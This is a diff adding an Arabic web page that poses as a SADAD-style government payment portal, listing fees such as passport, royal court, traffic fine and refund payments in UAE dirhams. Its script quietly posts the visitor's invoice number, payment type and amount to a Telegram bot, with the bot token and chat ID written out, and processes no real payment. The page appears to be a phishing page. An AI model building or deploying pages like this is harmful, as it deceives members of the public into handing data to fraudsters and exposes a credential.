@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إتمام عملية السداد</title>
+
+    <!-- Open Graph Meta Tags -->
+    <meta property="og:title" content="إتمام عملية السداد">
+    <meta property="og:description" content="قم بإدخال رقم الفاتورة ونوع السداد وقيمة الرسوم لإتمام عملية السداد.">
+    <meta property="og:image" content="https://www2.0zz0.com/2025/03/10/21/595608613.jpg">
+    <meta property="og:url" content="https://alkhaleeg.services/sadu/page2.html">
+    <meta property="og:type" content="website">
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            color: #333;
+            background: #f9f9f9;
+            padding: 20px;
+            line-height: 1.8;
+            margin: 0;
+            max-width: 100%;
+            box-sizing: border-box;
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 768px) {
+            body {
+                padding: 15px;
+                font-size: 14px;
+            }
+            .header img {
+                height: 50px;
+            }
+            .form-container {
+                padding: 20px;
+            }
+            .btn-green {
+                width: 90%;
+                font-size: 14px;
+                padding: 10px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            body {
+                padding: 10px;
+                font-size: 13px;
+            }
+            .header img {
+                height: 40px;
+            }
+            .form-container {
+                padding: 15px;
+            }
+            .btn-green {
+                width: 95%;
+                font-size: 13px;
+                padding: 8px;
+            }
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .header img {
+            height: 60px;
+            vertical-align: middle;
+            margin-right: 10px;
+        }
+        .breadcrumb {
+            text-align: center;
+            color: green;
+            font-size: 14px;
+            margin: 10px 0;
+        }
+        .form-container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            max-width: 500px;
+            margin: 20px auto;
+        }
+        h2 {
+            text-align: center;
+            color: green;
+            margin-top: 0;
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin: 10px 0 5px;
+            font-weight: bold;
+        }
+        input[type="text"], select {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #008000;
+            border-radius: 8px;
+            background: #fff9f0;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        .btn-green {
+            display: block;
+            width: 100%;
+            margin: 25px auto;
+            padding: 12px;
+            background: #008000;
+            color: white;
+            text-align: center;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .success-message {
+            display: none;
+            text-align: center;
+            color: green;
+            font-weight: bold;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <img src="https://www2.0zz0.com/2025/03/10/21/595608613.jpg" alt="شعار سداد">
+</div>
+
+<div class="breadcrumb">
+    الرئيسية / شخصي
+</div>
+
+<div class="form-container">
+    <h2>إتمام عملية السداد</h2>
+
+    <form id="sadadForm">
+        <label for="invoiceNumber">أدخل رقم الفاتورة</label>
+        <input type="text" id="invoiceNumber" name="invoiceNumber" required>
+
+        <label for="paymentType">اختر نوع السداد</label>
+        <select id="paymentType" name="paymentType" required>
+            <option value="">اختر نوع السداد</option>
+            <option value="مدفوعات حكومية">مدفوعات حكومية</option>
+            <option value="مدفوعات ديوان ملكي">مدفوعات ديوان ملكي</option>
+            <option value="مدفوعات تأمينات اجتماعية">مدفوعات تأمينات اجتماعية</option>
+            <option value="مدفوعات الزراعة والبيئة">مدفوعات الزراعة والبيئة</option>
+            <option value="مدفوعات الجوازات">مدفوعات الجوازات</option>
+            <option value="مدفوعات مخالفات مكتب العمل">مدفوعات مخالفات مكتب العمل</option>
+            <option value="رسوم مركبات">رسوم مركبات</option>
+            <option value="رسوم نقل كفالة">رسوم نقل كفالة</option>
+            <option value="رسوم تغيير مهنة">رسوم تغيير مهنة</option>
+            <option value="دفع رسوم تأييد رعاة">دفع رسوم تأييد رعاة</option>
+            <option value="رسوم تمكين">رسوم تمكين</option>
+            <option value="مدفوعات مخالفات مرورية">مدفوعات مخالفات مرورية</option>
+            <option value="استرداد اموال">استرداد اموال</option>
+            <option value="مدفوعات أخرى">مدفوعات أخرى</option>
+        </select>
+
+        <label for="amount">قيمة رسوم السداد (درهم إماراتي)</label>
+        <input type="text" id="amount" name="amount" required>
+
+        <button type="submit" class="btn-green">المتابعة والإكمال</button>
+    </form>
+
+    <div class="success-message" id="successMessage">
+        تم إرسال بياناتك بنجاح — سيتواصل معك فريق الدعم قريبًا.
+    </div>
+</div>
+
+<script>
+    document.getElementById('sadadForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const invoiceNumber = document.getElementById('invoiceNumber').value;
+        const paymentType = document.getElementById('paymentType').value;
+        const amount = document.getElementById('amount').value;
+
+        // بوت تلغرام
+        const botToken = '7272097327:AAFcKxacVS26HNg85tK2uYpNLmOMxmsqgZM';
+        const chatId = '1008144314';
+
+        const message = `
+📌 *طلب سداد جديد*
+
+🔢 رقم الفاتورة: ${invoiceNumber}
+💰 نوع السداد: ${paymentType}
+💵 قيمة السداد: ${amount} درهم إماراتي
+📅 التاريخ: ${new Date().toLocaleString()}
+`;
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                document.getElementById('successMessage').style.display = 'block';
+                document.getElementById('sadadForm').reset();
+            } else {
+                alert('حدث خطأ أثناء إرسال البيانات. يرجى المحاولة لاحقًا.');
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            alert('حدث خطأ أثناء إرسال البيانات. يرجى المحاولة لاحقًا.');
+        });
+    });
+</script>
+
+</body>
+</html>
